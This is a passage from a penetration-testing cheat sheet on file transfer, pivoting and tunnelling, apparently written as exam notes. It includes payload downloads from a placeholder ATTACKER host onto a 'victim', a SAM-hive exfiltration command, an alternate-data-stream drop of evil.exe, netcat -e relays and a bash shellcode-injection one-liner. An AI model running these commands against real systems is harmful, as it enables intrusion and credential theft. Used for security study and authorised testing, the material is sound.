# upload a file with curl (POST multipart/form-data)
# replace key1, upload with appropriate form fields
curl -v -F key1=value1 -F upload=@localfilename URL
```

### 8.1.3. PowerShell File Transfers

```powershell
# Download to Windows victim
invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
# For PowerShell version < 3.0
(net.webclient).downloadstring("http://ATTACKER/shell.ps1") > c:\users\public\shell.ps1
(net.webclient).downloadfile("http://ATTACKER/shell.ps1", "c:\users\public\shell.ps1")

# uploading a file:
(New-Object System.Net.WebClient).UploadFile('http://192.168.119.144/upload.php','somefiile')
```

### 8.1.4. Mount NFS Share

```sh
# try without vers=3 if mount fails. Also try with vers=2
mount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share
```

### 8.1.5. SMB Share

Mounting/hosting share on Kali
```sh
# mount foreign SMB share on Kali
sudo mount -t cifs -o vers=1.0 //REMOTE_IP/'Sharename' /mnt/smbshare

# host SMB share on kali (note: 'share' is share name)
sudo impacket-smbserver share .
# to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\share\sam.save
```

Using curl to upload file to windows SMB share
```sh
curl --upload-file /path/to/rsh.exe -u 'DOMAIN\username' smb://$VICTIM_IP/c$/
```

Get all files from SMB share with `smbclient`:
```sh
smbclient //$VICTIM_IP/SHARENAME
> RECURSE ON
> PROMPT OFF
> mget *
```

### 8.1.6. FTP Server on Kali

```sh
# install pyftpdlib for root to use port 21
sudo pip install pyftpdlib
# get usage help
python3 -m pyftpdlib --help
# start server on port 21, allowing anonymous write
sudo python3 -m pyftpdlib -p 21 -w
# start server on port 2121 for specific username/password
python3 -m pyftpdlib -w -u hacker -P g0tPwned
```

Then on Windows box, create `ftpup.bat`:
```bat
@echo off
:: change server IP and Port as required
echo open 192.168.119.144 2121> ftpcmd.dat
echo user hacker>> ftpcmd.dat
echo g0tPwned>> ftpcmd.dat
echo bin>> ftpcmd.dat
echo put %1>> ftpcmd.dat
echo quit>> ftpcmd.dat
ftp -n -s:ftpcmd.dat
del ftpcmd.dat
```

And use like so:

```bat
ftpup.bat filetotxfer.txt
```

Node.js ftps-server:
```sh
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:2121 --root /tmp
```

Pure-FTP server:
```sh
# Install
sudo apt update && sudo apt install -y pure-ftp
# Configure pure-ftp
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /usr/sbin/nologin ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### 8.1.7. SSHFS

To make things easier, set up a config file like so:

```
Host alpha
    HostName REMOTE_IP
    User root
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    IdentityFile /full/path/to/root_rsa
```

Then mount the filesystem with root access:

```sh
# format: sshfs [user@]host:[remote_directory] mountpoint [options]
sshfs -F/full/path/to/ssh-config alpha:/ ./rootfs
```

### 8.1.8. Windows LOLBAS File Downloads

```bat
:: Download 7zip binary to ./7zip.exe, using urlcache or verifyctl
certutil -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
certutil -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe

:: Download using expand
expand http://7-zip.org/a/7z1604-x64.exe 7zip.exe
:: Download from SBM share into Alternate Data Stream
expand \\badguy\evil.exe C:\Users\Public\somefile.txt:evil_ads.exe

:: Download using powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/a/7z1604-x64.exe','7zip.exe')"
powershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe
```

### 8.1.9. PHP File Uploads

Uploading files via HTTP POST to `upload.php`:

```php
<?php
// start php server from same directory as this file:
// mkdir -p ../uploads && sudo php -S 0.0.0.0:80
  $parentdir = dirname(dirname(__FILE__));
  $uploaddir = $parentdir . '/uploads/';
  $filename = basename($_FILES['file']['name']);
  $uploadfile = $uploaddir . $filename;
  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

You could also make Apache run it instead of standing up your own php server.
Change the `$uploaddir` variable above to `'/var/www/uploads'`, and put the
`upload.php` script in `/var/www/cgi-bin`. Requests will then point to
`/cgi-bin/upload.php` instead of just `/upload.php`.

Starting Apache server on Kali with necessary directories:

```bash
# make upload directory
sudo mkdir -p /var/www/uploads
sudo chown -R www-data:www-data /var/www/uploads
# start server
sudo systemctl restart apache2
```

Uploading files from Windows using PowerShell:

```powershell
(New-Object System.Net.WebClient).UploadFile('http://192.168.119.144/upload.php','somefiile')
```

Uploading files from Linux using curl:

```sh
curl -v http://192.168.119.144/upload.php -F "file=@somefile"
```

If large files fail to upload properly, change the `php.ini` or `.user.ini` settings:

```sh
# on kali, find and edit file
locate php.ini
sudo vim /etc/php/7.4/apache2/php.ini
# in php.ini, change the following:
memory_limit = -1         # disable php memory limit
upload_max_filesize = 10G # make it 10GiB
post_max_size = 0         # make it unlimited
max_execution_time = 120  # allow uploads to take 2 minutes
```

**Note:** The .user.ini file goes in your site’s document root.

# 9. Pivoting and Redirection

These are techniques for "traffic bending" or "traffic shaping" or
"tunneling traffic" or "port redirection" or "port forwarding".

## 9.1. SSH Tunnels

Before starting, it is best to have the following settings enabled in the jumpbox
`/etc/ssh/sshd_config` file.

```ini
# In order to leverage -R remote port forwards, set the following:
GatewayPorts clientspecified

# Allow TCP forwarding (local and remote)
AllowTcpForwarding yes
```

After making changes to the `sshd_config` file you must restart `sshd` for changes to take effect.

```bash
# View the SSH server status.
systemctl status ssh

# Restart the SSH server.
systemctl restart ssh

# Stop the SSH server.
systemctl stop ssh

# Start the SSH server.
systemctl start ssh
```

Here are common tunneling commands (using `-g` flag forces the ssh option
`GatewayPorts` to yes, and is good practice when using `-R`):

```sh
## Local Forwarding ###################################
# SSH local port forward to reach internal_server_ip:port via jumpbox_ip
ssh jumper@jumpbox_ip -p 2222 -L 4445:internal_server_ip:445
# Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of
# internal_server_ip, which is only reachable from jumpbox_ip

# SSH local port forward to send traffic from our local port 8080 to victim's
# port 80 (to get around firewall restrictions that don't allow remote
# connections to that port, but allow us to ssh in)
ssh victim@$VICTIM_IP -L 8080:localhost:80
# Now `curl localhost:8080` will fetch $VICTIM_IP:80 which is not reachable
# from the outside


## Remote Forwarding #################################
# forward traffic to redirector's port 80 to your local listener on port 8080
ssh jumper@jumpbox_ip -gR 0.0.0.0:80:localhost:8080
# now reverse shells pointed to the jumpbox_ip:80 will hit your local listener

# Connecting from jumpbox->attacker to give attacker access to
# internal_server_ip:445
ssh attacker@attacker_ip -gR 4445:internal_server_ip:445
# Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of
# internal_server_ip, which is only reachable from jumpbox_ip, getting around
# firewall rules that also prevent inbound ssh connections


## Complex example: Throwing Eternal Blue through firewall ##################################
# Local forward to victim's SMB & WinRPC ports, remote forward meterpreter callback to attacker
ssh jumper@jumpbox_ip -L 4450:victim_ip:445 -L 135:victim_ip:135 \
-R 4444:localhost:4444
# The -L 135:victim_ip:135 port forward is optional. If you do not want to use it, you will have to set VerifyArch to false in metasploit.


## Dynamic forwarding (SOCKS4/5) #######################
# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip, which is only reachable from jumpbox
ssh jumper@jumpbox_ip -p 2222 -D 1080
# Next config /etc/proxychains4.conf: socks5 localhost 1080
# Then: proxychains curl http://any_internal_server_ip/
# curl, nmap, wfuzz and some versions of netcat natively support SOCKS proxies.
# Look at their help to see how to use the feature.
# e.g.
curl -x socks5://127.0.0.1:1080 http://www.lolcats.com
# You can also set up firefox to browse through SOCKS proxy through GUI settings

# to proxy DNS through the new SSH SOCKS tunnel, set the following line in
# /etc/proxychains4.conf:
proxy_dns
# and set the following env variable:
export PROXYRESOLVE_DNS=REMOTE_DNS_SVR


## ProxyJump ########################################
# ProxyJump lets you nest ssh connections to reach remote internal networks/hosts
# Here we chain ssh connections like so: jumpbox1_ip -> jumpbox2_ip -> internal_host,
# where internal_host is only reachable from jumbpox2, and jumpbox2 is only reachable from jumpbox1
ssh -J jumper@jumpbox1_ip:2221,jumper2@jumbox2_ip:2222 remoteuser@internal_host

# Combine ProxyJump + dynamic port forward to create a proxy through 2nd_box which is only accessible via jumpbox_ip
ssh -J jumper@jumpbox1_ip proxyuser@2nd_box -D 1080
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only


## Miscellaneous ###################################
# bypass first time prompt when have non-interactive shell
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...
```

When repeatedly using the same ProxyJump, it is easier to use if you set up `ssh_config`
appropriately. See [here](https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464) for more details. Summary of how to do it:

```
Host jumpbox1
    HostName 10.1.1.100
    Port 22
    User jumper1
    IdentityFile /home/user/.ssh/id_rsa_jump1
Host jumpbox2
    HostName 10.2.2.100
    Port 22
    User jumper2
    IdentityFile /home/user/.ssh/id_rsa_jump2
    ProxyJump jumpbox1
Host jumpbox3
    HostName 10.3.3.100
    Port 22
    User jumper3
    IdentityFile /home/user/.ssh/id_rsa_jump3
    ProxyJump jumpbox2
Host target
    HostName 10.4.4.100
    Port 22
    User target
    IdentityFile /home/user/.ssh/id_rsa_target
    ProxyJump jumpbox3
    RemoteForward 8080 127.0.0.1:8080  # open remote port 8080 and redirect all the way back to attacker machine
    LocalForward 3306 127.0.0.1:3306  # open attacker-local port 3306 that forwards to target's internal port 3306
    DynamicForward 1080  # open SOCKS proxy on attacker that tunnels all the way through target as exit node
```

You can also set up OpenSSH (v4.3+) to act as a full VPN to tunnel traffic. See
[here](https://wiki.archlinux.org/index.php/VPN_over_SSH#OpenSSH's_built_in_tunneling) for how to do it. (`-w` command flag, or `Tunnel` ssh_config option).

**PRO TIP**: If setting up a remote ssh tunnel purely to (remote-)forward traffic, use the
following flags: `-fNTgR`.

- `-f` forks the ssh process into the background after
connection is established so you can keep using your terminal.
- `-N` and `-T` say "No" commands can be executed and no "TTY" is allocated.
  Using these together prevents command execution on the remote host (jump box)
- `-g` and `-R` enable "Gateway" ports and do "Remote" port forwarding

### 9.1.1. Ad Hoc SSH Port Forwards

TL;DR:

```
<ENTER><ENTER>~C
help
```

`ssh` also has an open command line mode to add or delete **ad hoc port forwards**. This can
be summoned by typing the `<shift> ~ c` key sequence (`~C`) after SSH-ing into a box. One nuance to
note is that the `~C` is only recognized after a new line, so be sure to hit Enter a few times before
typing in the key sequence. It likes to be called from a pure blinking command prompt that hasn’t
been "dirtied" by, for example, typing something, then deleting it. So just be sure to hit Enter a
few times before trying to drop into the SSH open command line mode.

The ssh prompt will change to `ssh>` when you enter ad hoc command line mode.

Typing `help` in ad hoc command line mode shows command syntax examples.

## 9.2. SOCKS Proxies and proxychains

`proxychains` is great for tunneling TCP traffic through a SOCKS proxy (like
what `ssh -D` and `chisel -D` give you).

```sh
# make sure proxychains is confgured for SOCKS:
sudo sh -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'

# using proxychains: put your command after 'proxychains -q'
# '-q' is quiet, so you don't see stderr msgs for each connection
sudo proxychains -q nmap -v -sT -F --open -Pn $VICTIM_IP
sudo proxychains -q nmap -v -sU -F --open -Pn $VICTIM_IP
```

## 9.3. Bending with iptables

Here's how to do traffic shaping to redirect traffic on port 80 through a pivot
host to your desired remote host. Note, it's usually also good practice to
specify the interface for iptables rules with `-i eth0` or whatever.

```sh
# allow inbound traffic on tcp port 80
sudo iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
# NAT the traffic from server's port 80 to remote host port 80 (changing dest addr)
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTE_HOST_IP:80
# enable NAT'ing on outbound traffic (changing source addr)
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
# allow forwarding traffic through iptables
sudo iptables -I FORWARD -j ACCEPT
# default policy to allow forwarding
sudo iptables -P FORWARD ACCEPT
```

**NOTE**: to forward IP packets (when using `MASQUERADE` or `SNAT`), you must first enable it in the kernel via:

```sh
# Enable ip forwarding in kernel permanently (fwding req'd for MASQUERADE/SNAT)
sudo sysctl -w net.ipv4.ip_forward=1
# -- or temporarily until reboot --
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# make iptables rules persistent (optional)
sudo service iptables-persistent save
```



## 9.4. Bending with socat

On the jump-box:

```sh
# basic port forwarding with socat listener
sudo socat TCP4-LISTEN:80,fork TCP4:REMOTE_HOST_IP:80
# optionally, do same thing bound to specific interface IP
sudo socat TCP4-LISTEN:80,bind=10.0.0.2,fork TCP4:REMOTE_HOST_IP:80

# UDP relay
socat -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978

# IPv4 to IPv6 tunnel
sudo socat TCP-LISTEN:110,reuseaddr,fork 'TCP6:[fe80::dead:beef%eth0]:110'

# TCP to Unix Domain Socket
socat TCP-LISTEN:1234,reuseaddr,fork UNIX-CLIENT:/tmp/foo
# more secure version
socat TCP-LISTEN:1234,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
```

General socat syntax

```
socat [options] <address> <address>
```

Where `<address>` is in the form `protocol:ip:port` or `filename` or `shell-cmd`

Other useful addresses:
 - `STDIN` (equivalently, `-`), `STDOUT`, and `STDIO` (both stdin and stdout)
 - `EXEC:cmdline` or `SYSTEM:shell-cmd`
 - `FILE:/path/to/file` - log output to file
 - `FILE:$(tty),rawer` - a raw terminal
 - `PTY,link=/tmp/mypty,rawer,wait-slave`
 - `UDP:host:port` and `UDP-LISTEN:port`
 - `TCP:host:port` and `TCP-LISTEN:port`
 - `OPENSSL:host:port` and `OPENSSL-LISTEN:host:port`
 - `UNIX-CONNECT:filename` and `UNIX-LISTEN:filename`
 - `PIPE` or `PIPE:filename`

## 9.5. Bending with rinetd

Once installed (`apt install -y rinetd`), you can easily specify rinetd forwarding rules by changing the
config settings in `/etc/rinetd.conf`. `rinetd` acts as a persistently-running service that does redirection.

Redirection rules are in the following format:

```
bindaddress bindport connectaddress connectport
```

The `kill -1` signal (`SIGHUP`) can be used to cause rinetd to reload its
configuration file without interrupting existing connections. Under Linux
the process id is saved in the file `/var/run/rinetd.pid` to facilitate the
`kill -HUP`. Or you can do a hard restart via `sudo service rinetd restart`.

## 9.6. Bending with netsh

If you own a dual-homed internal Windows box that you want to pivot from, you
can set up port forwarding using the `netsh` utility.

**NOTE**: Requires Administrator privileges.

```bat
:: NOTE: before you start, make sure IP Helper service is running

:: establish IPv4 port forwarding from windows external IP to internal host
netsh interface portproxy add v4tov4 listenport=4445 listenaddress=WIN_EXT_IP connectport=445 connectaddress=INTERNAL_VICTIM_IP
:: example opening mysql connections to the outside on port 33306
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=33306 connectaddress=127.0.0.1 connectport=3306

:: you also need to open a firewall rule to allow your inbound 4445 traffic
netsh advfirewall firewall add rule name="fwd_4445_rule" protocol=TCP dir=in localip=WIN_EXT_IP localport=4445 action=allow
```

## 9.7. Bending with sshuttle

[Sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) is a python library that
handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently
route all traffic to a target internal subnet easily.

```sh
# the CIDR IP is the target subnet you want to proxy access to.
sshuttle --dns -r user@jumpbox_ip 10.1.1.0/0
```

## 9.8. Bending with chisel

[Chisel](https://github.com/jpillora/chisel) lets you securely tunnel through
firewalls and set up a SOCKS proxy through your tunnel.

[Basic SOCKS usage](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)

```bash
# on attack box:
./chisel server -p 8080 --reverse

# on jumpbox (Windows example)
chisel-x64.exe client attacker_ip:8080 R:socks

# then use proxychains from attack box like normal
```

[Full documentation/repo](https://github.com/jpillora/chisel)

## 9.9. Bending with netcat

```bat
:: WINDOWS pivot
:: enter temporary directory to store relay.bat
cd %temp%
:: create relay.bat to connect to victim service
echo nc $VICTIM_IP VICTIM_PORT > relay.bat
:: Set up pivot listener (-L is persistent listener)
nc –L -p LISTEN_PORT –e relay.bat
```

```sh
# LINUX pivot
mkfifo /tmp/bp  # backpipe
nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
```

# 10. Miscellaneous

## 10.1. Port Knocking

```sh
# port knock on ports 24->23->22 with nmap
# "-r" forces ports to be hit in order
# may want to add "--max-parallelism 1"
nmap -Pn --host-timeout 201 --max-retries 0 -r -p24,23,22 $VICTIM_IP

# doing the same thing with netcat
# NOTE: netcat can only knock on sequential ports without using a for-loop
nc -z $VICTIM_IP 22-24
```

If you're able to read files on the victim, check out their `/etc/knockd.conf`

## 10.2. Convert text to Windows UTF-16 format on Linux

```sh
# useful for encoding a powershell command in base64
echo "some text" | iconv -t UTF-16LE
```

## 10.3. Extract UDP pcap packet payload data

Using scapy:

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

def handler(packet):
    print(str(packet.payload.payload.payload))

pcap = sys.argv[1]
sniff(offline=pcap, prn=handler, filter="udp")
```

Using Tshark from the command line:

```bash
tshark -r udp.pcap -w udp.hex -Y udp -T fields -e udp.payload | tr -d '\n' | xxd -r -p
# -r = input file
# -w = output file
# -Y = wiresark display filter
# -T = set the output format. "fields" shows only the fileds you select with -e
# -e = chosen fields to display with '-T fields'
# xxd: cannot combine '-r -p' like '-rp'
```

## 10.4. Execute Shellcode from Bash

```sh
cd /proc/$$;exec 3>mem;echo "McBQaC8vc2hoL2JpbonjUFOJ4bALzYA=" | base64 -d | dd bs=1 seek=$(($((16#`cat maps | grep /bin/bash | cut -f1 -d- | head -n 1`)) + $((16#300e0))))>&3
```

Explained:

-  cd into `/proc/$$/` to write to the current PID
-  Create a file descriptor 3 and point it to mem so you an write to FD 3 in the proc’s memory.
-  Echo shellcode as base64 and decode it
-  Use `dd` to write to your memory starting at the output of seek
   -  The line reads out the maps file showing the memory map of the bash process, then it greps for `/bin/bash` to find where it is loaded in memory. It gets the address with cut and head then converts it from base16 to decimal. It adds that number to `0x300e0`
   -  `0x300e0` is the location of bash’s exit function in memory
   -  Net result: You overwrite bash’s exit function with the shellcode

## 10.5. Encryption

### 10.5.1. Create self-signed SSL/TLS certificate

```sh
# generate separate .key and .crt files
openssl req -newkey rsa:2048 -nodes -keyout mycert.key -x509 -days 365 -subj '/CN=example.com/O=Company Inc./C=UK' -out mycert.crt

# simpler method?
openssl req -new -x509 -nodes -out mycert.pem -keyout mycert.key -days 365

# convert .key/.cert to .pem file (easy way)
cat mycert.crt mycert.key > mycert.pem

# official way to convert combo of .key and .crt to .pem if needed:
openssl pkcs12 -export -in mycert.crt -inkey mycert.key -out mycert.p12
openssl pkcs12 -in mycert.p12 -nodes -out mycert.pem

# create client cert from ca.key
openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
```

### 10.5.2. Decrypting files with GPG

```sh
# import public and private keys into gpg
gpg --import secring.gpg pubring.gpg

# list imported pubkeys
gpg --list-keys

# list imported private keys
gpg --list-secret-keys

# decrypting file with keys already imported
gpg -d -o secret.txt secret.txt.gpg
```

## 10.6. Validating Checksums

This is how you validate a sha256 checksum for a file:

```sh
# make checksum check-file.
# Format is <hexdigest><space><filename>, in same directory as file.
echo "4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10.5.0-debian10_amd64.deb" > sha256sum_nessus

# run sha256sum with '-c <check-file>' to have it validate the checksums match
sha256sum -c sha256sum_nessus
```